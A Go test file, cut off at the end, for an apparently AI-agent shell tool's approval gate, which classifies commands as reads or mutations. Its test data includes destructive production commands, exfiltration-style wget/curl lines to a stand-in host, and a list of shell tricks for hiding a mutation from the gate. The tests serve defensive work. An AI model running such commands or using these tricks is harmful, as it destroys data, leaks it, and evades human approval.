package tools

import (
	"strings"
	"testing"

	"nudgebee/llm/tools/core"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func requireShellMutationGuard(t *testing.T, tool ShellTool, input string) {
	t.Helper()
	requestType, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	if requestType != "" {
		assert.NotEqual(t, core.ToolRequestTypeRead, requestType,
			"mutation %q must not be classified as read", input)
		return
	}
	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.NotEmpty(t, prompt,
		"mutation %q must reach prompt classification instead of defaulting to read", input)
}

// TestExtractLeadingShellCommand pins the parser used by ShellTool's
// confirmation-gate classifier. Every branch here maps to a real
// shell-input shape we've seen in prod logs; getting the leading command
// wrong = the gate misfires (false-positive block on benign commands, or
// false-negative pass-through on mutations).
func TestExtractLeadingShellCommand(t *testing.T) {
	cases := []struct {
		name        string
		in          string
		wantLead    string
		wantCleaned string
	}{
		{"bare kubectl", "kubectl get pods", "kubectl", "kubectl get pods"},
		{"leading whitespace", "   kubectl get pods", "kubectl", "kubectl get pods"},
		{"trailing whitespace", "kubectl get pods   ", "kubectl", "kubectl get pods"},
		{"env var prefix", "KUBECONFIG=/x/y kubectl get pods", "kubectl", "kubectl get pods"},
		{"multiple env vars", "AWS_PROFILE=prod KUBECONFIG=/x kubectl get pods", "kubectl", "kubectl get pods"},
		{"env var with underscore + digits", "MY_VAR_2=foo aws s3 ls", "aws", "aws s3 ls"},
		{"quoted env var with spaces (shlex handles this — strings.Fields would misclassify)", `KUBECONFIG="/etc/kube config/config" kubectl get pods`, "kubectl", "kubectl get pods"},
		{"argument with spaces re-quoted for downstream classifier", `kubectl get pods -l "app in (foo, bar)"`, "kubectl", `kubectl get pods -l "app in (foo, bar)"`},
		{"argument with embedded double quote escaped", `kubectl annotate pod x note="hello \"world\""`, "kubectl", `kubectl annotate pod x "note=hello \"world\""`},
		{"jsonpath keeps non-expanding quotes", `kubectl get pods -o jsonpath='{.items[*].metadata.name}'`, "kubectl", `kubectl get pods -o 'jsonpath={.items[*].metadata.name}'`},
		{"single-quoted env var with spaces", `KUBECONFIG='/etc/kube config/config' kubectl get pods`, "kubectl", "kubectl get pods"},
		{"malformed quoting → bailout", `KUBECONFIG="/etc/kube config kubectl get pods`, "", ""},
		{"pipeline — leading command wins", "kubectl get pods | grep foo | jq .", "kubectl", "kubectl get pods | grep foo | jq ."},
		{"redirect — leading command wins", "kubectl get pods > /tmp/out", "kubectl", "kubectl get pods > /tmp/out"},
		{"non-CLI (grep) returns itself", "grep -R foo /var/log", "grep", "grep -R foo /var/log"},
		{"empty string", "", "", ""},
		{"all whitespace", "   \t  ", "", ""},
		{"cd prefix — bail out (safe default)", "cd /tmp && kubectl delete X", "", ""},
		{"eval prefix — bail out", "eval 'kubectl delete X'", "", ""},
		{"command substitution — bail out", "$(kubectl get pods)", "", ""},
		{"backtick command — bail out", "`kubectl get pods`", "", ""},
		{"bare sh — bail out (subshell wrapper)", "sh -c 'kubectl delete X'", "", ""},
		{"bare bash — bail out", "bash -c 'aws s3 rm bucket'", "", ""},
		{"env wrapper — unwrapped, cleaned drops the wrapper", "env FOO=bar kubectl get pods", "kubectl", "kubectl get pods"},
		{"sudo wrapper — unwrapped, cleaned drops the wrapper", "sudo kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo + env chain — both unwrapped, cleaned is bare command", "sudo env AWS_PROFILE=prod aws s3 rm bucket", "aws", "aws s3 rm bucket"},
		{"sudo with -E flag (no value)", "sudo -E kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo with -u flag (value = next token)", "sudo -u admin kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo with combined flags + user", "sudo -E -u admin kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo with --user=admin (embedded value)", "sudo --user=admin kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo with --user admin (long-form with next-token value)", "sudo --user admin kubectl delete X", "kubectl", "kubectl delete X"},
		{"env with -i flag", "env -i kubectl get pods", "kubectl", "kubectl get pods"},
		{"env with -i and env vars", "env -i KUBECONFIG=/x kubectl get pods", "kubectl", "kubectl get pods"},
		{"env with --unset (value = next token)", "env --unset PATH kubectl get pods", "kubectl", "kubectl get pods"},
		{"env with --chdir (value = next token)", "env --chdir /tmp kubectl get pods", "kubectl", "kubectl get pods"},
		{"env with -S (value = next token — env's split-string)", `env -S "AWS_PROFILE=prod" kubectl get pods`, "kubectl", "kubectl get pods"},
		{"sudo with -S (flag-only — sudo's --stdin, NOT a value-taker)", "sudo -S kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo with grouped short flags -Eu (last char takes value)", "sudo -Eu admin kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo with end-of-options --", "sudo -E -- kubectl delete X", "kubectl", "kubectl delete X"},
		{"sudo -- as the first arg after wrapper", "sudo -- kubectl delete X", "kubectl", "kubectl delete X"},
		{"subshell — bail out (safe default)", "(kubectl delete X)", "", ""},
		{"brace group — bail out (safe default)", "{ kubectl delete X; }", "", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			gotLead, gotCleaned := extractLeadingShellCommand(tc.in)
			assert.Equal(t, tc.wantLead, gotLead,
				"shell input %q should extract leading command %q", tc.in, tc.wantLead)
			assert.Equal(t, tc.wantCleaned, gotCleaned,
				"shell input %q should extract cleaned command %q (wrappers/env vars stripped)", tc.in, tc.wantCleaned)
		})
	}
}

// TestShellCommandPrefixRegistry_LookupIsCaseInsensitive pins that the
// prefix registry lookup ignores case — `Kubectl get pods` matches the
// `kubectl` registration.
func TestShellCommandPrefixRegistry_LookupIsCaseInsensitive(t *testing.T) {
	// Prime the registry (populates lazily on first call).
	first := core.LookupShellWrappable("kubectl")
	require.NotEmpty(t, first, "kubectl must be registered — otherwise the CLI tools are missing ShellCommandPrefixes")
	assert.Equal(t, first, core.LookupShellWrappable("KUBECTL"))
	assert.Equal(t, first, core.LookupShellWrappable("Kubectl"))
}

// TestShellCommandPrefixRegistry_UnknownReturnsEmpty pins the safe-default
// behavior: an unknown prefix returns "" (no gate). Otherwise every unknown
// shell command would incorrectly resolve to a random tool.
func TestShellCommandPrefixRegistry_UnknownReturnsEmpty(t *testing.T) {
	assert.Equal(t, "", core.LookupShellWrappable("some_binary_that_isnt_registered_ever"))
	assert.Equal(t, "", core.LookupShellWrappable(""))
}

// TestShellCommandPrefixRegistry_CoversExpectedCLIs pins the reviewed built-in
// CLI set. It verifies that every listed executable is discoverable and owned
// by the intended tool.
//
// Adds a new CLI? Add its prefix to the expected list here AND implement
// core.ShellWrappable on the tool. If the CLI is intentionally NOT
// gate-eligible (rare — most executables aren't), document why in a code
// comment on the tool struct.
func TestShellCommandPrefixRegistry_CoversExpectedCLIs(t *testing.T) {
	// The prefixes below are the executable names as typed at a real shell,
	// paired with the tool that owns them. Grep the codebase for
	// `func .*ShellCommandPrefixes` to see every current registration.
	expected := map[string]string{
		"kubectl":           "kubectl_execute",
		"aws":               "aws_execute",
		"gcloud":            "gcloud_execute",
		"gsutil":            "gcloud_execute",
		"bq":                "gcloud_execute",
		"az":                "azure_execute",
		"gh":                "github_execute",
		"glab":              "gitlab_execute",
		"helm":              "helm_execute",
		"argocd":            "argocd_execute",
		"clickhouse-client": "clickhouse_query_execute",
		"clickhouse":        "clickhouse_query_execute",
		"sqlcmd":            "mssql_query_execute",
		"mysql":             "mysql_query_execute",
		"sqlplus":           "oracle_query_execute",
		"psql":              "postgres_query_execute",
		"rabbitmqadmin":     "rabbit_execute",
		"rabbitmq-api":      "rabbit_execute",
		"rabbitmqctl":       "rabbit_execute",
		"redis-cli":         "redis_command_executer",
		"ssh":               "server_command_executor",
	}
	for prefix, expectedOwner := range expected {
		t.Run(prefix, func(t *testing.T) {
			got := core.LookupShellWrappable(prefix)
			assert.Equal(t, expectedOwner, got,
				"shell prefix %q must be owned by %q — either the tool's ShellCommandPrefixes was removed, or a new tool wrongly claimed this prefix",
				prefix, expectedOwner)
		})
	}
}

// TestShellTool_InferToolRequestType_UnknownCommandIsUnclassified pins that
// non-CLI commands (grep, jq, awk, cat, tail) return "" — auth_agent treats
// unclassified as read (no gate), which is the correct behavior for these
// read-only utility commands. Regressing this would slap a spurious
// confirmation dialog on every `grep` invocation.
func TestShellTool_InferToolRequestType_UnknownCommandIsUnclassified(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	cases := []string{
		"grep -R foo /var/log",
		"jq '.items[].metadata.name' out.json",
		"awk '{print $1}' /tmp/x",
		"cat /etc/hostname",
		"tail -f /var/log/app.log",
		"find / -name '*.conf'",
	}
	for _, input := range cases {
		t.Run(input, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Empty(t, string(got),
				"non-CLI command %q must be unclassified (empty), NOT flagged as create/update/delete", input)
		})
	}
}

func TestShellTool_LocalPipelineDoesNotSpendPromptClassification(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := "cat logs.txt | grep ERROR | head -20"

	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.Empty(t, got)
	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.Empty(t, prompt)
}

func TestShellTool_InferToolRequestType_ReadOnlyPipelineIsNotGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := `kubectl get pods -A | grep -E "clickhouse|redis" | head -20`

	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.NotEqual(t, core.ToolRequestTypeUpdate, got,
		"read-only kubectl pipelines must retain the leading command's classification")
	if got == "" {
		prompt, promptErr := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
		require.NoError(t, promptErr)
		assert.NotEmpty(t, prompt, "pipeline must dispatch to kubectl's prompt classifier")
	}
}

func TestShellTool_InferToolRequestType_KubectlAggregationPipelineIsRead(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := `kubectl get pods -A --no-headers -o custom-columns=NAMESPACE:.metadata.namespace | sort | uniq -c`

	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.Equal(t, core.ToolRequestTypeRead, got,
		"known kubectl reads followed by bounded local aggregation must avoid LLM classification")
}

func TestShellTool_InferToolRequestType_AwsCompoundReadsAreRead(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := "aws ec2 describe-instances --region us-east-1 --output json > /tmp/instances.json && " +
		"aws elbv2 describe-load-balancers --region us-east-1 --output json > /tmp/load-balancers.json && " +
		"jq -n --slurpfile instances /tmp/instances.json --slurpfile loadBalancers /tmp/load-balancers.json '{instances: $instances, load_balancers: $loadBalancers}'"

	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.Equal(t, core.ToolRequestTypeRead, got,
		"compound AWS reads with local aggregation must execute without mutation approval")
}

func TestShellTool_InferToolRequestType_AwsCompoundMutationFailsClosed(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := "aws ec2 describe-instances --region us-east-1 && " +
		"aws ec2 stop-instances --region us-east-1 --instance-ids i-1234567890abcdef0"

	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.Equal(t, core.ToolRequestTypeUpdate, got,
		"the wrapped AWS classifier's deterministic mutation should avoid prompt classification")
}

func TestShellTool_CompoundUsesStrongestWrappedStaticMutation(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	tests := map[string]struct {
		input string
		want  core.ToolRequestType
	}{
		"kubectl read then delete": {
			input: "kubectl get pods && kubectl delete pod api-123",
			want:  core.ToolRequestTypeDelete,
		},
		"kubectl create then update": {
			input: "kubectl create deployment api --image=nginx && kubectl scale deployment api --replicas=2",
			want:  core.ToolRequestTypeUpdate,
		},
	}
	for name, tc := range tests {
		t.Run(name, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", tc.input)
			require.NoError(t, err)
			assert.Equal(t, tc.want, got)
		})
	}
}

func TestShellTool_InferToolRequestType_AzureAndGcpCompoundReadsAreRead(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	tests := map[string]string{
		"azure": "az vm list --resource-group rg-prod --output json > /tmp/vms.json && " +
			"az network nsg list --resource-group rg-prod --output json > /tmp/nsgs.json && " +
			"jq -n --slurpfile vms /tmp/vms.json --slurpfile nsgs /tmp/nsgs.json '{vms: $vms, nsgs: $nsgs}'",
		"gcp": "gcloud compute instances list --project prod --format=json > /tmp/instances.json && " +
			"gcloud compute networks list --project prod --format=json > /tmp/networks.json && " +
			"jq -n --slurpfile instances /tmp/instances.json --slurpfile networks /tmp/networks.json '{instances: $instances, networks: $networks}'",
	}
	for name, input := range tests {
		t.Run(name, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Equal(t, core.ToolRequestTypeRead, got)
		})
	}
}

func TestShellTool_InferToolRequestType_AzureAndGcpMutationsFailClosed(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	tests := map[string]struct {
		input    string
		expected core.ToolRequestType
	}{
		"azure compound": {
			"az vm list --resource-group rg-prod && az vm stop --resource-group rg-prod --name vm-prod",
			core.ToolRequestTypeUpdate,
		},
		"azure remote command": {
			"az vm run-command invoke --resource-group rg-prod --name vm-prod --command-id RunShellScript --scripts 'ps aux'",
			core.ToolRequestTypeCreate,
		},
		"gcp compound": {
			"gcloud compute instances list --project prod && gcloud compute instances stop vm-prod --project prod --zone us-central1-a",
			core.ToolRequestTypeUpdate,
		},
		"bigquery query job": {
			"bq query --use_legacy_sql=false 'SELECT 1'",
			core.ToolRequestTypeUpdate,
		},
		"bigquery query job with assigned global flags": {
			"bq --project_id=my-project --location=US query --use_legacy_sql=false 'SELECT 1'",
			core.ToolRequestTypeUpdate,
		},
		"bigquery query job with space-separated global flags": {
			"bq --project_id my-project --location US query --use_legacy_sql=false 'SELECT 1'",
			core.ToolRequestTypeUpdate,
		},
		"bigquery query job after boolean global flag": {
			"bq --nosync query --use_legacy_sql=false 'SELECT 1'",
			core.ToolRequestTypeUpdate,
		},
	}
	for name, tc := range tests {
		t.Run(name, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", tc.input)
			require.NoError(t, err)
			assert.Equal(t, tc.expected, got)
		})
	}
}

func TestShellTool_InferToolRequestType_BigQueryQuotedQueryTextIsNotAJob(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := `bq show --description "my query table" dataset.table`

	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.Equal(t, core.ToolRequestTypeRead, got,
		"the word query inside a quoted flag value must not be mistaken for the query subcommand")
}

func TestShellTool_InferToolRequestType_RegisteredCLINameInArgumentIsUnclassified(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		`grep -Ei "clickhouse|redis|postgres" /tmp/services.txt`,
		`gh run view 123 --log-failed | grep clickhouse`,
		`echo '== DB ERRORS =='; grep -iE "error|clickhouse|sql" logs.txt | head -50`,
		`echo start && grep -iE "clickhouse|redis" logs.txt | head -20`,
	}

	for _, input := range inputs {
		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
		require.NoError(t, err)
		assert.NotEqual(t, core.ToolRequestTypeUpdate, got,
			"registered CLI names used as data must not trigger a confirmation")
	}
}

func TestShellTool_InferToolRequestType_LaterPipelineCLIIsGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"printf input | kubectl delete deployment prod",
		`printf input | sh -c 'kubectl delete deployment prod'`,
		"printf input | xargs kubectl delete deployment prod",
		"printf input | nohup kubectl delete deployment prod",
	}
	for _, input := range inputs {
		requireShellMutationGuard(t, tool, input)
	}
}

func TestShellTool_InferToolRequestType_SecurityBypassVectorsAreGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"echo bypass & kubectl delete deployment prod",
		"echo bypass 2>&1 & kubectl delete deployment prod",
		"echo $(kubectl delete deployment prod)",
		"echo `kubectl delete deployment prod`",
		"exec kubectl delete deployment prod",
		"nohup kubectl delete deployment prod",
		"nice kubectl delete deployment prod",
		"timeout 10s kubectl delete deployment prod",
		"time kubectl delete deployment prod",
		"watch kubectl delete deployment prod",
		"echo prod | xargs kubectl delete deployment",
		"cat <(kubectl delete deployment prod)",
		"cat >(kubectl delete deployment prod)",
		"> /dev/null kubectl delete deployment prod",
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			requireShellMutationGuard(t, tool, input)
		})
	}
}

func TestShellTool_InferToolRequestType_ArgumentOnlyUtilitiesRemainAllowed(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"cat services.txt | grep clickhouse",
		"jq '.clickhouse' package.json",
		"echo clickhouse | wc -l",
		"printf '%s' kubectl",
	}
	for _, input := range inputs {
		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
		require.NoError(t, err)
		assert.NotEqual(t, core.ToolRequestTypeUpdate, got)
	}
}

func TestShellTool_InferToolRequestType_ReadOnlyFallbackChainsAreNotGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"gh run view 32952788846 --repo nudgebee/opentelemetry-demo --log-failed || gh run view 32952788846 --repo nudgebee/opentelemetry-demo",
		"gh api repos/nudgebee/opentelemetry-demo/actions/jobs/98157420693/logs || echo 'No logs API'",
		"gh api repos/nudgebee/opentelemetry-demo/contents/.github/workflows 2>&1 || curl -s https://api.github.com/repos/nudgebee/opentelemetry-demo/contents/.github/workflows",
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.NotEqual(t, core.ToolRequestTypeUpdate, got)
			prompt, promptErr := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
			require.NoError(t, promptErr)
			assert.NotEmpty(t, prompt, "read-only fallback must dispatch its leading gh command")
		})
	}
}

func TestShellTool_InferToolRequestType_ReadOnlyRedirectionsAreNotGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"gh run view 123 --log-failed 2>&1",
		"gh run view 123 --log-failed >&2",
		"gh run view 123 --log-failed &>run.log",
		"kubectl get pods 2>&1",
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.NotEqual(t, core.ToolRequestTypeUpdate, got)
		})
	}
}

func TestShellTool_InferToolRequestType_ProductionReadOnlyCompoundsAreNotGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		`echo "=== PODS IN NUDGEBEE, REDIS, RABBIT ==="
kubectl get pods -n nudgebee -o wide
echo ""
kubectl get pods -n redis -o wide
echo ""
kubectl get pods -n rabbit -o wide
echo ""
echo "=== POD RESTARTS ACROSS ALL NAMESPACES ==="
kubectl get pods -A --sort-by='.status.containerStatuses[0].restartCount' | grep -v ' 0 ' | tail -n 30
echo ""
echo "=== TERMINATED / OOMKILLED CONTAINERS ==="
kubectl get pods -A -o jsonpath='{range .items[*]}{range .status.containerStatuses[*]}{if .lastState.terminated.reason}{.name}{" in pod "}{$.metadata.name}{"."}{$.metadata.namespace}{": terminated reason="}{.lastState.terminated.reason}{" exitCode="}{.lastState.terminated.exitCode}{" finishedAt="}{.lastState.terminated.finishedAt}{"\n"}{end}{end}{end}'`,
		"kubectl logs deployment/product-catalog -n demo > product.log && kubectl logs deployment/checkout -n demo > checkout.log && head -n 20 product.log checkout.log",
		"kubectl get pod product-catalog -n demo -o yaml; kubectl logs pod/product-catalog -n demo --previous",
		"kubectl get pods -A | grep -i chaos; kubectl get events -A | grep -i chaos",
		"kubectl get pods -n demo && kubectl logs product-catalog -n demo --all-containers=true",
		"env | grep -iE '(db|database|clickhouse|postgres|mysql|redis)' || true",
		"aws rds describe-db-instances --max-items 10 2>&1 || true",
		"gh api /repos/org/repo/actions/jobs/123 || true; echo check; gh api /repos/org/repo/check-runs/123 || true",
		"gh api /repos/org/repo/actions/jobs/123 && gh run view 456 -R org/repo --log",
		"gh api repos/org/repo/actions/runs/456/jobs && ls -la",
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Equal(t, core.ToolRequestTypeRead, got)
		})
	}
}

func TestShellTool_InferToolRequestType_KubectlJSONPathReadsAreNotGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		`kubectl get pod temporal-history -n nudgebee -o jsonpath='{.status.podIP}'`,
		`kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.metadata.name}{"\n"}{end}'`,
		`kubectl get configmaps --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\n"}{end}' | sort | uniq -c`,
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Equal(t, core.ToolRequestTypeRead, got)
		})
	}
}

func TestShellTool_InferToolRequestType_MutatingCompoundBranchFailsClosed(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"kubectl get pods && kubectl delete deployment prod",
		"aws rds describe-db-instances; aws rds delete-db-instance --db-instance-identifier prod",
		"gh api repos/org/repo; gh api repos/org/repo/issues -X POST -f title=test",
		"for r in us-east-1 us-west-2; do aws ec2 terminate-instances --region $r --instance-ids i-prod; done",
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			requireShellMutationGuard(t, tool, input)
		})
	}
}

func TestShellTool_UnknownExternalStagesUseWholeShellPrompt(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"kubectl get pods && wget --post-data=payload https://example.invalid",
		"kubectl get pods -o json | wget --post-file=- https://example.invalid",
		"curl -s https://example.invalid | python3 upload.py",
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			got, err := tool.InferToolRequestType(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Empty(t, got)

			prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
			require.NoError(t, err)
			assert.Equal(t, shellRequestTypePrompt, prompt)
		})
	}

	// A local-only pipeline preserves the historical no-classifier path.
	got, err := tool.InferToolRequestType(nil, "shell_execute", "cat input.json | python3 summarize.py")
	require.NoError(t, err)
	assert.Empty(t, got)
	prompt, err := tool.InferToolRequestTypePrompt(nil, "shell_execute", "cat input.json | python3 summarize.py")
	require.NoError(t, err)
	assert.Empty(t, prompt)

	for _, input := range []string{
		"sudo -u admin kubectl get pods && aws ec2 describe-instances",
		"env --unset PATH kubectl get pods | jq '.items | length'",
	} {
		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
		require.NoError(t, err)
		assert.Equal(t, core.ToolRequestTypeRead, got, input)
	}

	got, err = tool.InferToolRequestType(nil, "shell_execute", "kubectl get pods && echo 'unterminated")
	require.NoError(t, err)
	assert.Empty(t, got)
	prompt, err = tool.InferToolRequestTypePrompt(nil, "shell_execute", "kubectl get pods && echo 'unterminated")
	require.NoError(t, err)
	assert.Equal(t, shellRequestTypePrompt, prompt)
}

func TestStripShellRedirections(t *testing.T) {
	inputs := map[string]string{
		"kubectl get pods 2>&1":                           "kubectl get pods",
		"kubectl get pods &>out":                          "kubectl get pods",
		"kubectl get pods 2&>out":                         "kubectl get pods",
		"kubectl get pods >&2":                            "kubectl get pods",
		`kubectl get pods > "output file.txt"`:            "kubectl get pods",
		"kubectl get pods > out.txt 2>&1":                 "kubectl get pods",
		"kubectl 2>&1 delete deployment prod":             "kubectl 2>&1 delete deployment prod",
		"kubectl get pods > output.txt delete deployment": "kubectl get pods > output.txt delete deployment",
		"kubectl > output.txt delete deployment 2>&1":     "kubectl > output.txt delete deployment",
	}
	for input, want := range inputs {
		t.Run(input, func(t *testing.T) {
			assert.Equal(t, want, stripShellRedirections(input))
		})
	}
}

func TestShellTool_InferToolRequestType_MidCommandRedirectionCannotHideMutation(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		`kubectl 2>&1 delete deployment prod && echo done`,
		`kubectl > output.txt delete deployment prod; echo done`,
		`kubectl > output.txt delete deployment prod 2>&1 && echo done`,
	}
	for _, input := range inputs {
		requireShellMutationGuard(t, tool, input)
	}
}

func TestShellTool_InferToolRequestType_WrappedReadOnlyCurlCompoundIsNotGated(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"sudo curl -s https://example.com || true",
		"env TOKEN=value curl -s https://example.com || true",
		"kubectl get pods | curl -o/tmp/data.json https://example.com",
		"kubectl get pods | curl -HAuthorization:data https://example.com",
	}
	for _, input := range inputs {
		got, err := tool.InferToolRequestType(nil, "shell_execute", input)
		require.NoError(t, err)
		assert.Equal(t, core.ToolRequestTypeRead, got)
	}
}

func TestShellTool_InferToolRequestType_MutatingFallbackStillFailsClosed(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	inputs := []string{
		"gh run view 123 || kubectl delete deployment prod",
		"gh api repos/org/repo || curl -X DELETE https://api.github.com/repos/org/repo",
		"gh api repos/org/repo -X POST || echo failed",
	}
	for _, input := range inputs {
		t.Run(input, func(t *testing.T) {
			requireShellMutationGuard(t, tool, input)
		})
	}
}

// TestShellTool_InferToolRequestType_BailoutShapesFailClosed pins that
// shapes the leading-command parser cannot reduce (sh -c, cd &&, $(...),
// backtick) still fail closed when they contain a registered CLI.
func TestShellTool_InferToolRequestType_BailoutShapesFailClosed(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	cases := []string{
		"sh -c 'kubectl delete deploy prod'",
		"bash -c 'aws s3 rm s3://bucket/critical'",
		"cd /tmp && kubectl delete deploy prod",
		"$(kubectl delete deploy prod)",
		"`kubectl delete deploy prod`",
		"eval 'kubectl delete deploy prod'",
	}
	for _, input := range cases {
		t.Run(strings.SplitN(input, " ", 2)[0], func(t *testing.T) {
			requireShellMutationGuard(t, tool, input)
		})
	}
}

func TestShellTool_InferToolRequestType_ProductionJSONInput(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := `{"command":"kubectl delete deployment prod"}`
	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	if got == "" {
		prompt, promptErr := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
		require.NoError(t, promptErr)
		assert.NotEmpty(t, prompt, "JSON-wrapped production input must dispatch to kubectl's prompt classifier")
		return
	}
	assert.Equal(t, core.ToolRequestTypeDelete, got,
		"JSON-wrapped production input must dispatch to kubectl's static classifier")
}

func TestShellTool_InferToolRequestType_AmbiguousCLIShapesFailClosed(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	cases := []string{
		"grep ready status.txt && kubectl delete deployment prod",
		"aws s3 ls s3://bucket && aws s3 rm s3://bucket/critical",
		"k=kubectl; $k delete deployment prod",
		"command kubectl delete deployment prod",
	}
	for _, input := range cases {
		t.Run(input, func(t *testing.T) {
			requireShellMutationGuard(t, tool, input)
		})
	}
}

func TestShellTool_InferToolRequestType_AbsolutePathUsesCLIClassifier(t *testing.T) {
	tool := ShellTool{AccountId: "test-account"}
	input := "/usr/local/bin/kubectl get pods"

	got, err := tool.InferToolRequestType(nil, "shell_execute", input)
	require.NoError(t, err)
	assert.NotEqual(t, core.ToolRequestTypeUpdate, got,
		"an absolute path to a read-only CLI command must not be conservatively gated as an update")
	if got == "" {
		prompt, promptErr := tool.InferToolRequestTypePrompt(nil, "shell_execute", input)
		require.NoError(t, promptErr)
		assert.NotEmpty(t, prompt, "absolute executable path must dispatch to the CLI's prompt classifier")
	}
}

// TestSystemToolFactories_ShellWrappableContract asserts that every registered
// system-tool factory that IMPLEMENTS ShellWrappable satisfies the interface
// contract when probed with `core.SystemAccountIDForProbe` — the exact
// sentinel the runtime shell-wrappable registry uses. Specifically:
//   - factory returns a non-nil tool without panicking, and
//   - ShellCommandPrefixes returns at least one prefix.
//
// This test lives in the `tools` package (not `tools/core`) because
// nbSystemTools is populated by each CLI package's init() function. Running
// this in `tools/core` would see an empty map (no factories registered there
// — circular dep prevents core from importing tools) and silently pass with
// 0 subtests. Placing it here forces the tools package's init chain to run
// first, populating the registry.
//
// Factories that fail to instantiate (returning an error or nil) are SKIPPED
// rather than failed — this mirrors prod behavior in
// populateShellWrappableRegistry which logs slog.Error and continues. Real
// prod causes of factory error are environmental (DB unreachable, credentials
// missing) and can't be reproduced in a unit-test context.
//
// Coverage of the specific expected CLI prefixes is enforced separately by
// TestShellCommandPrefixRegistry_CoversExpectedCLIs — this test is the
// symmetric interface-contract check for any new ShellWrappable additions.
func TestSystemToolFactories_ShellWrappableContract(t *testing.T) {
	visited := 0
	wrappableCount := 0
	core.VisitSystemToolFactories(func(name string, factory func(accountId string) (core.NBTool, error)) {
		visited++
		t.Run(name, func(t *testing.T) {
			var tool core.NBTool
			var err error
			assert.NotPanics(t, func() {
				tool, err = factory(core.SystemAccountIDForProbe)
			}, "factory for %q must not panic on SystemAccountIDForProbe", name)
			if err != nil || tool == nil {
				// Mirrors populateShellWrappableRegistry's slog.Error path —
				// environmental factory failures (DB, credentials) drop the
				// tool's prefixes in prod too, and the coverage test flags
				// any missing expected prefix. Skip here.
				t.Skipf("factory error=%v (tool nil? %v) — likely environmental (DB/creds); skipping ShellWrappable check", err, tool == nil)
				return
			}
